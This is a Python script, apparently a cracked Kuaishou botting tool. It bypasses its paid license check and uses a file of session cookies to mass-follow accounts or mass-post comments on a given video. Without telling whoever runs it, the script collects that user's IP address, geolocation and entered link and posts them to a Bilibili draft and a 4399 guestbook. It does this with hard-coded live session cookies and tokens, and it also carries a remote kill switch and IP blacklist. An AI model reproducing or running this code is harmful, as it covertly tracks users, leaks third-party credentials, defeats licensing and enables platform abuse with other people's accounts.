import sys
import subprocess

required_libraries = ["requests", "json", "time", "hashlib", "random", "datetime", "webbrowser", "re", "time", "os",
                      "multiprocessing"]

missing_libraries = []
for lib in required_libraries:
    try:
        __import__(lib)
    except ImportError:
        missing_libraries.append(lib)

if missing_libraries:
    print(f"缺少库: {', '.join(missing_libraries)}")
    install = input("是否要自动安装缺少的库？(y/n): ").strip().lower()
    if install == 'y':
        subprocess.check_call([sys.executable, '-m', 'pip', 'install', *missing_libraries])
        for lib in missing_libraries:
            __import__(lib)
    else:
        print("不安装可能导会致运行错误❌")

import requests
import hashlib
import json
import time
import random
import datetime
import webbrowser
import urllib.request
import re
import os
import time
# 字体颜色变量
black = "\033[30m"  # 黑色
red = "\033[31m"  # 红色
green = "\033[32m"  # 绿色
yellow = "\033[33m"  # 黄色
blue = "\033[34m"  # 蓝色
magenta = "\033[35m"  # 品红（洋红）
cyan = "\033[36m"  # 青色
white = "\033[37m"  # 白色

# 加粗字体颜色变量
bold_black = "\033[1;30m"  # 加粗黑色
bold_red = "\033[1;31m"  # 加粗红色
bold_green = "\033[1;32m"  # 加粗绿色
bold_yellow = "\033[1;33m"  # 加粗黄色
bold_blue = "\033[1;34m"  # 加粗蓝色
bold_magenta = "\033[1;35m"  # 加粗品红（洋红）
bold_cyan = "\033[1;36m"  # 加粗青色
bold_white = "\033[1;37m"  # 加粗白色

# 下划线字体颜色变量
underline_black = "\033[4;30m"  # 下划线黑色
underline_red = "\033[4;31m"  # 下划线红色
underline_green = "\033[4;32m"  # 下划线绿色
underline_yellow = "\033[4;33m"  # 下划线黄色
underline_blue = "\033[4;34m"  # 下划线蓝色
underline_magenta = "\033[4;35m"  # 下划线品红（洋红）
underline_cyan = "\033[4;36m"  # 下划线青色
underline_white = "\033[4;37m"  # 下划线白色

# 背景颜色变量
bg_black = "\033[40m"  # 黑色背景
bg_red = "\033[41m"  # 红色背景
bg_green = "\033[42m"  # 绿色背景
bg_yellow = "\033[43m"  # 黄色背景
bg_blue = "\033[44m"  # 蓝色背景
bg_magenta = "\033[45m"  # 品红（洋红）背景
bg_cyan = "\033[46m"  # 青色背景
bg_white = "\033[47m"  # 白色背景

# 重置样式变量，用于恢复默认显示
reset = "\033[0m"  # 恢复默认样式



start_time = time.time()
sum = 0
bai = "\033[3m"     #斜体
hx = "\033[4m"      #下划线
red = "\033[31m"    #红色
green = '\033[32m'   #绿色
redd = "\033[0m"     #还原字体

print(bold_cyan + '伏笔破解' + redd)
print(bold_red+ '伏笔1072385033  ' + redd)
print('\n')
print(bg_yellow +'伏笔温馨提示 ：输入卡密环节直接乱输就行' + redd)
print('\n')
print(bold_green + "伏笔卡网：fubi.lol")
print(bold_magenta + '倒卖死妈!!!!!!!\n')
print(bold_red + "伏笔卡网：fubi.lol")
print(bold_magenta + '倒卖死妈!!!!!!!\n')
print(bold_green + "伏笔卡网：fubi.lol")
print(bold_magenta + '倒卖死妈!!!!!!!\n')
print(bold_red + "伏笔卡网：fubi.lol")
print(bold_magenta + '倒卖死妈!!!!!!!\n')
print(bold_green + "伏笔卡网：fubi.lol")
print(bold_magenta + '倒卖死妈!!!!!!!\n')
print(bold_red + "伏笔卡网：fubi.lol")
print(bold_magenta + '倒卖死妈!!!!!!!\n')
print(bold_green + "伏笔卡网：fubi.lol")
print(bold_magenta + '倒卖死妈!!!!!!!\n')
print(bold_red + "伏笔卡网：fubi.lol")
print(bold_magenta + '倒卖死妈!!!!!!!\n')
time.sleep(3)
print(bold_yellow + "下面就是原作者的骚话了 不是我写的 被骗不负责")
print(redd + "================")
page = requests.get('https://share.weiyun.com/183vf7EV')
iii = re.findall('iiii【(.*?)】', page.text)  # 取值
iiii = ''.join([i.strip('') for i in iii[0]])  # 去括号

def test_internet_connection():
    url = 'https://fubi.lol'
    try:
        urllib.request.urlopen(url, timeout=5)
        print(green + "网络连接正常" + redd)
    except urllib.error.URLError as ex:
        print(red + "网络连接异常" + redd)


test_internet_connection()
# 配置
WEIURL = "http://wy.llua.cn";  # 云验证地址
RC4KEY = "r8CD4BrDjICp9AF";  # RC4密钥
DLCODE = 163464;  # 登录状态码
EDITION = "5.5";  # 当前版本号


# 必要函数
def md5(input_string):
    md5_hash = hashlib.md5(input_string.encode()).hexdigest()
    return md5_hash


def rc4_decrypt(key, data):
    if not isinstance(key, bytes):
        key = key.encode('utf-8')
    S = list(range(256))
    j = 0
    for i in range(256):
        j = (j + S[i] + key[i % len(key)]) % 256
        S[i], S[j] = S[j], S[i]

    i = 0
    j = 0
    result = []
    for byte in data:
        i = (i + 1) % 256
        j = (j + S[i]) % 256
        S[i], S[j] = S[j], S[i]
        k = S[(S[i] + S[j]) % 256]
        result.append(byte ^ k)
    return bytes(result)


def rc4_encrypt(key, data):
    if not isinstance(key, bytes):
        key = key.encode('utf-8')

    if not isinstance(data, bytes):
        data = data.encode('utf-8')
    S = list(range(256))
    j = 0
    for i in range(256):
        j = (j + S[i] + key[i % len(key)]) % 256
        S[i], S[j] = S[j], S[i]
    i = 0
    j = 0
    result = []
    for byte in data:
        i = (i + 1) % 256
        j = (j + S[i]) % 256
        S[i], S[j] = S[j], S[i]
        k = S[(S[i] + S[j]) % 256]
        result.append(byte ^ k)
    return bytes(result)


# 更新
def CheckUpData():
    print("正在检测更新...")
    ini = requests.post(WEIURL + "/api/?id=ini&app=" + iiii)
    iniJson = json.loads(rc4_decrypt(RC4KEY, bytes.fromhex(ini.text)))
    if (iniJson['msg']['version'] == EDITION):
        print("已是最新版本")
    else:
        print("有新版本")
        print("更新内容：" + (red + iniJson['msg']['app_update_show']) + redd)
        GX1 = input('是否更新(y=是)：')
        if GX1 == "y":
            url = iniJson['msg']['app_update_url']
            print("正在跳转链接……")
            webbrowser.open_new(url)

            print("更新地址：" + (red + iniJson['msg']['app_update_url']) + redd)
        if (iniJson['msg']['app_update_must'] == 'y'):
            print(green + '需要强制更新' + redd)
            exit()


# 公告
def Notice():
    notice = requests.post(WEIURL + "/api/?id=notice&app=" + iiii)
    print("公告：\n", (red + json.loads(rc4_decrypt(RC4KEY, bytes.fromhex(notice.text)))['msg']['app_gg']) + redd)


# 登录
def Login(kami, ID):
    TIME = int(time.time())
    VALUE = 1 + random.random() * (10 - 1 + 1) + TIME
    SIGN = md5("kami={}&markcode={}&t={}&{}".format(kami, ID, TIME, "91616PXU0Lu0PPpp"))
    DATA = bytes.hex(
        rc4_encrypt(RC4KEY, "kami={}&markcode={}&t={}&sign={}&value={}".format(kami, ID, TIME, SIGN, VALUE)))
    loginData = requests.get(WEIURL + "/api/?id=kmlogon&app=" + iiii + "&data=" + DATA)
    loginJson = json.loads(rc4_decrypt(RC4KEY, bytes.fromhex(loginData.text)))
    if (loginJson['code'] == DLCODE):
        if (loginJson['check'] == md5("{}{}{}".format(loginJson['time'], "91616PXU0Lu0PPpp", VALUE))):
            print("登录成功，到期时间：" + datetime.datetime.fromtimestamp(loginJson['msg']['vip']).strftime(
                '%Y-%m-%d %H:%M:%S'))
            YULUO_KSQIANDAO()
        else:
            print("伏笔已破解！")
            YULUO_KSQIANDAO()
    else:
        print("伏笔已破解！")
        YULUO_KSQIANDAO()


def Login3(kami, ID):
    TIME = int(time.time())
    VALUE = 1 + random.random() * (10 - 1 + 1) + TIME
    SIGN = md5("kami={}&markcode={}&t={}&{}".format(kami, ID, TIME, "91616PXU0Lu0PPpp"))
    DATA = bytes.hex(
        rc4_encrypt(RC4KEY, "kami={}&markcode={}&t={}&sign={}&value={}".format(kami, ID, TIME, SIGN, VALUE)))
    loginData = requests.get(WEIURL + "/api/?id=kmlogon&app=" + iiii + "&data=" + DATA)
    loginJson = json.loads(rc4_decrypt(RC4KEY, bytes.fromhex(loginData.text)))
    if (loginJson['code'] == DLCODE):
        if (loginJson['check'] == md5("{}{}{}".format(loginJson['time'], "91616PXU0Lu0PPpp", VALUE))):
            print("登录成功，到期时间：" + datetime.datetime.fromtimestamp(loginJson['msg']['vip']).strftime(
                '%Y-%m-%d %H:%M:%S'))
            YULUO_KSQIANDAO3()
        else:
            print("伏笔已破解！")
            YULUO_KSQIANDAO3()
    else:
        print("伏笔已破解！")
        YULUO_KSQIANDAO3()


def Login5(kami, ID):
    TIME = int(time.time())
    VALUE = 1 + random.random() * (10 - 1 + 1) + TIME
    SIGN = md5("kami={}&markcode={}&t={}&{}".format(kami, ID, TIME, "91616PXU0Lu0PPpp"))
    DATA = bytes.hex(
        rc4_encrypt(RC4KEY, "kami={}&markcode={}&t={}&sign={}&value={}".format(kami, ID, TIME, SIGN, VALUE)))
    loginData = requests.get(WEIURL + "/api/?id=kmlogon&app=" + iiii + "&data=" + DATA)
    loginJson = json.loads(rc4_decrypt(RC4KEY, bytes.fromhex(loginData.text)))
    if (loginJson['code'] == DLCODE):
        if (loginJson['check'] == md5("{}{}{}".format(loginJson['time'], "91616PXU0Lu0PPpp", VALUE))):
            print("登录成功，到期时间：" + datetime.datetime.fromtimestamp(loginJson['msg']['vip']).strftime(
                '%Y-%m-%d %H:%M:%S'))
            YULUO_KSQIANDAO5()
        else:
            print("伏笔已破解！")
            YULUO_KSQIANDAO5()
    else:
        print("伏笔已破解！")
        YULUO_KSQIANDAO5()


def Login7(kami, ID):
    TIME = int(time.time())
    VALUE = 1 + random.random() * (10 - 1 + 1) + TIME
    SIGN = md5("kami={}&markcode={}&t={}&{}".format(kami, ID, TIME, "91616PXU0Lu0PPpp"))
    DATA = bytes.hex(
        rc4_encrypt(RC4KEY, "kami={}&markcode={}&t={}&sign={}&value={}".format(kami, ID, TIME, SIGN, VALUE)))
    loginData = requests.get(WEIURL + "/api/?id=kmlogon&app=" + iiii + "&data=" + DATA)
    loginJson = json.loads(rc4_decrypt(RC4KEY, bytes.fromhex(loginData.text)))
    if (loginJson['code'] == DLCODE):
        if (loginJson['check'] == md5("{}{}{}".format(loginJson['time'], "91616PXU0Lu0PPpp", VALUE))):
            print("登录成功，到期时间：" + datetime.datetime.fromtimestamp(loginJson['msg']['vip']).strftime(
                '%Y-%m-%d %H:%M:%S'))
            YULUO_KSQIANDAO7()
        else:
            print("伏笔已破解")
            YULUO_KSQIANDAO7()
    else:
        print("伏笔已破解")
        YULUO_KSQIANDAO7()


def Login9(kami, ID):
    TIME = int(time.time())
    VALUE = 1 + random.random() * (10 - 1 + 1) + TIME
    SIGN = md5("kami={}&markcode={}&t={}&{}".format(kami, ID, TIME, "91616PXU0Lu0PPpp"))
    DATA = bytes.hex(
        rc4_encrypt(RC4KEY, "kami={}&markcode={}&t={}&sign={}&value={}".format(kami, ID, TIME, SIGN, VALUE)))
    loginData = requests.get(WEIURL + "/api/?id=kmlogon&app=" + iiii + "&data=" + DATA)
    loginJson = json.loads(rc4_decrypt(RC4KEY, bytes.fromhex(loginData.text)))
    if (loginJson['code'] == DLCODE):
        if (loginJson['check'] == md5("{}{}{}".format(loginJson['time'], "91616PXU0Lu0PPpp", VALUE))):
            print("登录成功，到期时间：" + datetime.datetime.fromtimestamp(loginJson['msg']['vip']).strftime(
                '%Y-%m-%d %H:%M:%S'))
            YULUO_KSQIANDAO9()
        else:
            print("伏笔已破解！")
            YULUO_KSQIANDAO9()
    else:
        print("伏笔已破解！")
        YULUO_KSQIANDAO9()


def YULUO_KSQIANDAO():
    page = requests.get('https://share.weiyun.com/183vf7EV')

    if '脚本开关状态【关】' in page.text:

        print('脚本状态：', (red + '脚本维护' + redd))
        exit()
    else:
        print(green + '脚本正常开放' + redd)

        main_menu()


def YULUO_KSQIANDAO3():
    page = requests.get('https://share.weiyun.com/183vf7EV')

    if '脚本开关状态【关】' in page.text:

        print('脚本状态：', (red + '脚本维护' + redd))
        exit()
    else:
        print(green + '脚本正常开放' + redd)

        main_menu3()


def YULUO_KSQIANDAO5():
    page = requests.get('https://share.weiyun.com/183vf7EV')

    if '脚本开关状态【关】' in page.text:

        print('脚本状态：', (red + '脚本维护' + redd))
        exit()
    else:
        print(green + '脚本正常开放' + redd)

        main_menu5()


def YULUO_KSQIANDAO7():
    page = requests.get('https://share.weiyun.com/183vf7EV')

    if '脚本开关状态【关】' in page.text:

        print('脚本状态：', (red + '脚本维护' + redd))
        exit()
    else:
        print(green + '脚本正常开放' + redd)

        main_menu7()


def YULUO_KSQIANDAO9():
    page = requests.get('https://share.weiyun.com/183vf7EV')

    if '脚本开关状态【关】' in page.text:

        print('脚本状态：', (red + '脚本维护' + redd))
        exit()
    else:
        print(green + '脚本正常开放' + redd)

        main_menu9()


def main_menu():
    import requests
    import re
    import json
    import time
    import urllib.request
    import os
    bai = "\033[3m"
    hx = "\033[4m"
    red = "\033[31m"
    green = '\033[32m'
    redd = "\033[0m"
    print(
        green + '伏笔已破解' + redd)

    time_tuple = time.localtime(time.time())
    A = "{}.{}.{}『{}:{}:{}』".format(time_tuple[0], time_tuple[1], time_tuple[2], time_tuple[3], time_tuple[4],
                                    time_tuple[5])

    page = requests.get('https://www.ipip.net/ip-js/')
    ss = (page.text)
    f = re.findall('[\u4e00-\u9fa5]', ss)
    f = ''.join([i for i in f if i != ' '])

    from urllib.parse import quote
    text = f
    encoded_text = quote(text)
    f = encoded_text
    ff = (f.replace('%E4%B8%AD%E5%9B%BD', '%5B%3A513%5D'))
    from urllib.parse import quote
    text1 = A
    encoded_text1 = quote(text1)
    A = encoded_text1

    urlc = "https://api.pearktrue.cn/api/hitokoto/"
    responsec = requests.get(urlc)
    print(responsec.text)
    page = requests.get('https://share.weiyun.com/183vf7EV')
    req = requests.get("http://txt.go.sohu.com/ip/soip")
    ip = re.findall('window.sohu_user_ip="(.*?)";', req.text)[0]
    if ip in page.text:
        print('你已被作者列入黑名单')
        exit()
    xzh = re.findall('接口数量【(.*?)】黑', page.text)  # 取值
    xzh = ''.join([i.strip('') for i in xzh])  # 去括号
    xzh = (red + xzh + redd)

    url66666 = "http://tool.pfan.cn/shorturl/restore"
    yul = input('输入作品链接：')
    yul = re.findall('https://v.kuaishou.com/(.*?) ', yul)  # 取值
    yul = ''.join([i.strip('') for i in yul])
    yul = 'https://v.kuaishou.com/' + yul
    if yul == "https://v.kuaishou.com/":
        print("输入的链接有误")
        print("提示:链接需要带文案")
        exit()
    print('链接为' + yul)
    from urllib.parse import quote
    text = yul
    encoded_text = quote(text)
    yull = encoded_text
    aaaaaaaa = 'shorturl='
    aaaaaaaaa = aaaaaaaa + yull
    payload66666 = aaaaaaaaa

    headers66666 = {
        'User-Agent': "Apache-HttpClient/UNAVAILABLE (java 1.4)",
        'Connection': "Keep-Alive",
        'Accept-Encoding': "identity",
        'Content-Type': "application/x-www-form-urlencoded"
    }

    response66666 = requests.post(url66666, data=payload66666, headers=headers66666)
    a1 = response66666.text
    a111 = re.findall('&photoId=(.*?)&', a1)  # 取值
    a222 = re.findall('&userId=(.*?)&', a1)  # 取值
    a1111 = ''.join([i.strip('') for i in a111])  # 去括号
    a2222 = ''.join([i.strip('') for i in a222])  # 去括号
    print('作者ID：' + a2222)
    print('作品ID：' + a1111)

    url = "https://www.kuaishou.com/graphql"
    payload = json.dumps({
        "operationName": "visionFollow",
        "variables": {
            "touid": a2222,
            "ftype": 1,
            "followSource": 3,
        },
        "query": "mutation visionFollow($touid: String, $ftype: Int, $followSource: Int, $expTag: String) {\n  visionFollow(touid: $touid, ftype: $ftype, followSource: $followSource, expTag: $expTag) {\n    result\n    followStatus\n    hostName\n    error_msg\n    __typename\n  }\n}\n"
    })

    urld = "https://api.bilibili.com/x/article/creative/draft/addupdate"

    headersd = {
        'User-Agent': "Mozilla/5.0 (Linux; Android 12; PERM00 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/97.0.4692.98 Mobile Safari/537.36 os/android model/PERM00 build/8050400 osVer/12 sdkInt/31 network/2 BiliApp/8050400 mobi_app/android channel/oppo Buvid/XUCFEB8C1A43F7B6AF1F78AA911EC9792E5B7 sessionID/47b581c4 innerVer/8050410 c_locale/zh_CN s_locale/zh_CN disable_rcmd/0 8.5.0 os/android model/PERM00 mobi_app/android build/8050400 channel/oppo innerVer/8050410 osVer/12 network/2",
        'Accept': "application/json, text/plain, */*",
        'native_api_from': "h5",
        'buvid': "XUCFEB8C1A43F7B6AF1F78AA911EC9792E5B7",
        'referer': "https://www.bilibili.com/read/editor/?timestamp=1726635745343&theme=0#/",
        'content-type': "application/x-www-form-urlencoded; charset=utf-8",
        'x-bili-trace-id': "60aabcf68c3f45c2a5906e23f466ea5e:a5906e23f466ea5e:0:0",
        'x-bili-aurora-eid': "UFcEQlAABlUFWw==",
        'x-bili-mid': "1354140427",
        'x-bili-aurora-zone': "",
        'x-bili-gaia-vtoken': "",
        'x-bili-ticket': "eyJhbGciOiJIUzI1NiIsImtpZCI6InMwMyIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3MjY2NjQ1MzgsImlhdCI6MTcyNjYzNTQzOCwiYnV2aWQiOiJYVUNGRUI4QzFBNDNGN0I2QUYxRjc4QUE5MTFFQzk3OTJFNUI3In0.WxGdzggcGru9GhFM7F8QqOJi5jm5wnNVd__wTF9X5mA",
        'bili-http-engine': "cronet",
        'Cookie': "SESSDATA=ec317462%2C1742187722%2Cc9810591CjDv_9wLbQ4jrnuANiP3bKtSY6zHvTk-ki-xy_EXFxOm_zMmrQinJgJ9YxRL-xFvbVESVjBUUmlMVFpOSWFoRHFnLThaaEswR3F0MkRUNVFwbGk1dVNmS3prbEJwU2pWdlZzS3hqYS0xbHJHeXJIVnZZYW5XaHZzYmZWRjFCaWtZRXZSSTM1eHBBIIEC; bili_jct=f7fb369cdb6bd6074a01e14134354c3d; DedeUserID=1354140427; DedeUserID__ckMd5=068b8d07b8c30df4; sid=p2c2tflq; Buvid=XUCFEB8C1A43F7B6AF1F78AA911EC9792E5B7"
    }

    urla = "https://mapi.yxhapi.com/user/sns/box/android/v3.0/guestBook-send.html"

    headersa = {
        'User-Agent': "4399GameCenter/8.5.0.14(android;PERM00;12;1080x2237;WIFI;2152.1033;yyys.3849)",
        'Connection': "Keep-Alive",
        'Accept-Encoding': "gzip",
        'Content-Type': "application/x-www-form-urlencoded",
        'pauth': "3361448649%7C2234157995%7Ct3ce7n18014adbafaa96b1a00c7630c6%7C1726423874%7C10002%7C0f7a190f552694ecc8a8f3ba3b49abeb%7C2",
        'X-Yxh3': "gG.xNmMwNzk0NjY1YmE0ZN.Y",
        'mudid': "3asog2UMzP8ZhZIyB1oAB9fab",
        'zxaid': "A01-YWep7z5DqWqCuFFVRqiUu5LDd44IZcl7",
        'X-Yxh1': "gG.xNmMwNzk0NjY1YmE0ZN.Y",
        'SM-DEVICEID': "20240821151037a3634af90439cbc666c2aaa92f14ae1f019313897fbf46b1",
        'mauth': "f4eafd2406c13750f162bb2a14202fb1",
        'Mbox': "b%3DbmpONy",
        'mauthcode': "12690cd79|2c8e0d552d3f3b017edc9e4a0680fa7f|3361448649",
        'mareacode': "999999",
        'X-T': "DT0yNjQyNDQxM3w4OGY1fDcyNGE4MMcc"
    }

    yulll = (yul.replace('https://v.kuaishou.com/', ''))

    from urllib.parse import quote
    payloadd = f"access_key=754b2585e49d1dd723c032e020447b91CjDv_9wLbQ4jrnuANiP3bKtSY6zHvTk-ki-xy_EXFxOm_zMmrQinJgJ9YxRL-xFvbVESVjBUUmlMVFpOSWFoRHFnLThaaEswR3F0MkRUNVFwbGk1dVNmS3prbEJwU2pWdlZzS3hqYS0xbHJHeXJIVnZZYW5XaHZzYmZWRjFCaWtZRXZSSTM1eHBBIIEC&appkey=1d8b6e7d45233436&banner_url=&category=15&comment_selected=0&content=%7B%22ops%22%3A%5B%7B%22insert%22%3A%22{A}%5CnIP%E5%9C%B0%E5%9D%80%EF%BC%9A{ip}%5Cn%E4%BD%8D%E7%BD%AE%EF%BC%9A{f}%5Cn%E9%93%BE%E6%8E%A5%EF%BC%9A{yull}%5Cn%22%7D%5D%7D&csrf=f7fb369cdb6bd6074a01e14134354c3d&disable_rcmd=0&image_urls=&list_id=0&media_id=&mobi_app=android&origin_image_urls=&original=0&platform=android&reprint=0&spoiler=&statistics=%7B%22appId%22%3A1%2C%22platform%22%3A3%2C%22version%22%3A%228.5.0%22%2C%22abtest%22%3A%22%22%7D&summary={A}%20IP%E5%9C%B0%E5%9D%80%EF%BC%9A{ip}%20%E4%BD%8D%E7%BD%AE%EF%BC%9A{f}%20%E9%93%BE%E6%8E%A5%EF%BC%9A{yull}&tid=1&title={yull}&top_video_bvid=&ts=1726635775&type=3&up_reply_closed=0&w_rid=6fc16c7c7ec32532081fd6393f011554&words=18&wts=1726635776&sign=0ace845a3ce5f1c1f11517ff929e0718"
    responsed = requests.post(urld, data=payloadd, headers=headersd)
    payloada = f"gameId=&commentId=&reuid=&type=user&tid=3361448649&content={A}%0AIP%E5%9C%B0%E5%9D%80%EF%BC%9A{ip}%0A%E4%BD%8D%E7%BD%AE%EF%BC%9A{ff}%0A%E9%93%BE%E6%8E%A5%EF%BC%9A{yulll}"
    responsea = requests.post(urla, data=payloada, headers=headersa)

    sent = 0
    with open("Cookie.txt", "r") as file:
        phone_numbers = file.readlines()
    import multiprocessing
    # 核验Cookie
    referer = f"https://www.kuaishou.com/short-video/{a1111}?authorId={a2222}&streamSource=profile&area=profilexxnull"
    while phone_numbers:

        for sent in range(9999):
            Cookie = phone_numbers[0].strip()
            Cookie = Cookie.replace("ⅰ", "i")
            with open('Cookie.txt', 'r') as file:
                lines = file.readlines()
            num_lines = len(lines)
            zhsl = (red + str(num_lines) + redd)

            headers = {
                'User-Agent': "Mozilla/5.0 (iPad; U; CPU OS 6_0 like Mac OS X; zh-CN; iPad2)",
                'Connection': "Keep-Alive",
                'Accept-Encoding': "identity",
                'accept-language': "zh-CN",
                'Referer': referer,
                'Charsert': "utf-8",
                'Content-Type': "application/json; charset=utf-8",
                'Cookie': Cookie
            }
            yuluoyyds = '"result":1'
            response = requests.post(url, data=payload, headers=headers)
            id_found = yuluoyyds in response.text
            Cookie9999 = re.findall('userId=(.*?); kuaishou.server.web_st', Cookie)  # 取值
            Cookie99999 = (('账号') + (red + str(Cookie9999) + redd))
            if id_found:
                print((sent), (Cookie99999), (green + "：✔关注成功") + redd, ("接口剩余"), (zhsl))
            else:
                print((sent), (Cookie99999), (red + "：❌关注失败") + redd, ("接口剩余"), (zhsl))
            del phone_numbers[0]
            with open("Cookie.txt", "w") as file:
                for phone in phone_numbers:
                    file.write(phone)
            processes = []
            for _ in range(1):
                p = multiprocessing.Process()
                processes.append(p)
                p.start()

                # 等待所有进程完成
            for p in processes:
                p.join()


def main_menu3():
    import requests
    import re
    import json
    import time
    import urllib.request
    import os
    bai = "\033[3m"
    hx = "\033[4m"
    red = "\033[31m"
    green = '\033[32m'
    redd = "\033[0m"
    print(
        green + '伏笔破解 卡网fubi.lol  ' + redd)

    time_tuple = time.localtime(time.time())
    A = "{}.{}.{}『{}:{}:{}』".format(time_tuple[0], time_tuple[1], time_tuple[2], time_tuple[3], time_tuple[4],
                                    time_tuple[5])

    page = requests.get('https://www.ipip.net/ip-js/')
    ss = (page.text)
    f = re.findall('[\u4e00-\u9fa5]', ss)
    f = ''.join([i for i in f if i != ' '])

    from urllib.parse import quote
    text = f
    encoded_text = quote(text)
    f = encoded_text
    ff = (f.replace('%E4%B8%AD%E5%9B%BD', '%5B%3A513%5D'))
    from urllib.parse import quote
    text1 = A
    encoded_text1 = quote(text1)
    A = encoded_text1

    urlc = "https://api.pearktrue.cn/api/hitokoto/"
    responsec = requests.get(urlc)
    print(responsec.text)
    page = requests.get('https://share.weiyun.com/183vf7EV')
    req = requests.get("http://txt.go.sohu.com/ip/soip")
    ip = re.findall('window.sohu_user_ip="(.*?)";', req.text)[0]
    if ip in page.text:
        print('你已被作者列入黑名单')
        exit()
    url66666 = "http://tool.pfan.cn/shorturl/restore"
    yul = input('输入作品链接：')
    yul = re.findall('https://v.kuaishou.com/(.*?) ', yul)  # 取值
    yul = ''.join([i.strip('') for i in yul])
    yul = 'https://v.kuaishou.com/' + yul
    if yul == "https://v.kuaishou.com/":
        print("输入的链接有误")
        print("提示:链接需要带文案")
        exit()
    print('链接为' + yul)

    from urllib.parse import quote
    text = yul
    encoded_text = quote(text)
    yull = encoded_text
    aaaaaaaa = 'shorturl='
    aaaaaaaaa = aaaaaaaa + yull
    payload66666 = aaaaaaaaa

    headers66666 = {
        'User-Agent': "Apache-HttpClient/UNAVAILABLE (java 1.4)",
        'Connection': "Keep-Alive",
        'Accept-Encoding': "identity",
        'Content-Type': "application/x-www-form-urlencoded"
    }

    response66666 = requests.post(url66666, data=payload66666, headers=headers66666)
    a1 = response66666.text
    a111 = re.findall('&photoId=(.*?)&', a1)  # 取值
    a222 = re.findall('&userId=(.*?)&', a1)  # 取值
    a1111 = ''.join([i.strip('') for i in a111])  # 去括号
    a2222 = ''.join([i.strip('') for i in a222])  # 去括号
    print('作者ID：' + a1111)
    print('作品ID：' + a2222)

    url = "https://www.kuaishou.com/graphql"
    pinl = input("输入评论内容：")
    payload = json.dumps({
        "operationName": "visionAddComment",
        "variables": {
            "photoId": a1111,
            "content": pinl,
            "photoAuthorId": a2222
        },
        "query": "mutation visionAddComment($photoId: String, $photoAuthorId: String, $content: String, $replyToCommentId: ID, $replyTo: ID, $expTag: String) {\n  visionAddComment(photoId: $photoId, photoAuthorId: $photoAuthorId, content: $content, replyToCommentId: $replyToCommentId, replyTo: $replyTo, expTag: $expTag) {\n    result\n    commentId\n    content\n    timestamp\n    status\n    __typename\n  }\n}\n"
    })

    urld = "https://api.bilibili.com/x/article/creative/draft/addupdate"

    headersd = {
        'User-Agent': "Mozilla/5.0 (Linux; Android 12; PERM00 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/97.0.4692.98 Mobile Safari/537.36 os/android model/PERM00 build/8050400 osVer/12 sdkInt/31 network/2 BiliApp/8050400 mobi_app/android channel/oppo Buvid/XUCFEB8C1A43F7B6AF1F78AA911EC9792E5B7 sessionID/47b581c4 innerVer/8050410 c_locale/zh_CN s_locale/zh_CN disable_rcmd/0 8.5.0 os/android model/PERM00 mobi_app/android build/8050400 channel/oppo innerVer/8050410 osVer/12 network/2",
        'Accept': "application/json, text/plain, */*",
        'native_api_from': "h5",
        'buvid': "XUCFEB8C1A43F7B6AF1F78AA911EC9792E5B7",
        'referer': "https://www.bilibili.com/read/editor/?timestamp=1726635745343&theme=0#/",
        'content-type': "application/x-www-form-urlencoded; charset=utf-8",
        'x-bili-trace-id': "60aabcf68c3f45c2a5906e23f466ea5e:a5906e23f466ea5e:0:0",
        'x-bili-aurora-eid': "UFcEQlAABlUFWw==",
        'x-bili-mid': "1354140427",
        'x-bili-aurora-zone': "",
        'x-bili-gaia-vtoken': "",
        'x-bili-ticket': "eyJhbGciOiJIUzI1NiIsImtpZCI6InMwMyIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3MjY2NjQ1MzgsImlhdCI6MTcyNjYzNTQzOCwiYnV2aWQiOiJYVUNGRUI4QzFBNDNGN0I2QUYxRjc4QUE5MTFFQzk3OTJFNUI3In0.WxGdzggcGru9GhFM7F8QqOJi5jm5wnNVd__wTF9X5mA",
        'bili-http-engine': "cronet",
        'Cookie': "SESSDATA=ec317462%2C1742187722%2Cc9810591CjDv_9wLbQ4jrnuANiP3bKtSY6zHvTk-ki-xy_EXFxOm_zMmrQinJgJ9YxRL-xFvbVESVjBUUmlMVFpOSWFoRHFnLThaaEswR3F0MkRUNVFwbGk1dVNmS3prbEJwU2pWdlZzS3hqYS0xbHJHeXJIVnZZYW5XaHZzYmZWRjFCaWtZRXZSSTM1eHBBIIEC; bili_jct=f7fb369cdb6bd6074a01e14134354c3d; DedeUserID=1354140427; DedeUserID__ckMd5=068b8d07b8c30df4; sid=p2c2tflq; Buvid=XUCFEB8C1A43F7B6AF1F78AA911EC9792E5B7"
    }

    urla = "https://mapi.yxhapi.com/user/sns/box/android/v3.0/guestBook-send.html"

    headersa = {
        'User-Agent': "4399GameCenter/8.5.0.14(android;PERM00;12;1080x2237;WIFI;2152.1033;yyys.3849)",
        'Connection': "Keep-Alive",
        'Accept-Encoding': "gzip",
        'Content-Type': "application/x-www-form-urlencoded",
        'pauth': "3361448649%7C2234157995%7Ct3ce7n18014adbafaa96b1a00c7630c6%7C1726423874%7C10002%7C0f7a190f552694ecc8a8f3ba3b49abeb%7C2",
        'X-Yxh3': "gG.xNmMwNzk0NjY1YmE0ZN.Y",
        'mudid': "3asog2UMzP8ZhZIyB1oAB9fab",
        'zxaid': "A01-YWep7z5DqWqCuFFVRqiUu5LDd44IZcl7",
        'X-Yxh1': "gG.xNmMwNzk0NjY1YmE0ZN.Y",
        'SM-DEVICEID': "20240821151037a3634af90439cbc666c2aaa92f14ae1f019313897fbf46b1",
        'mauth': "f4eafd2406c13750f162bb2a14202fb1",
        'Mbox': "b%3DbmpONy",
        'mauthcode': "12690cd79|2c8e0d552d3f3b017edc9e4a0680fa7f|3361448649",
        'mareacode': "999999",
        'X-T': "DT0yNjQyNDQxM3w4OGY1fDcyNGE4MMcc"
    }

    urlb = "https://api.pearktrue.cn/api/sensitivewords/"
    paramsb = {
        'text': pinl
    }
    responseb = requests.get(urlb, params=paramsb)

    yulll = (yul.replace('https://v.kuaishou.com/', ''))
    if '*' in responseb.text:
        wgc = responseb.json()
        wgcc = (wgc["data"]['detected_words'])
        wgccc = ''.join([i.strip('') for i in wgcc])  # 去括号
        pinll = quote(pinl)
